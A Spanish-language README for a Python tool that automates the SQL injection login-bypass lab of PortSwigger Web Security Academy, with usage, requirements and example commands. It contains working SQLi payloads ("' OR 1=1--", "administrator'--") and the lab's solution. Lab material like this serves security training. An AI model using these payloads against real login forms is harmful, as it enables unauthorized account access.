# SQL Injection - Login Bypass (PortSwigger Lab)

Este script en Python automatiza un ataque de **SQL Injection** para omitir el inicio de sesión en un sitio vulnerable, como los propuestos en los laboratorios de [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection/lab-login-bypass).

---

## Descripción del laboratorio

> Este laboratorio contiene una vulnerabilidad de inyección SQL en la función de login.  
> Para resolver el laboratorio, realiza un ataque SQLi que permita iniciar sesión como el usuario **administrator**.

---

## Uso

```bash
python3 login_bypass_sqli.py <url_de_login> "<payload_sqli>"
```

## Requisitos

- Python 3
    
- Librerías necesarias:
    
    - `requests`
        
    - `beautifulsoup4`

Instala las dependencias con:

`pip install -r requirements.txt`

### Ejemplo

`python3 login_bypass_sqli.py "https://0aef00-lab.web-security-academy.net/login" "' OR 1=1--"`


>Respuesta: "<url>" "administrator'--"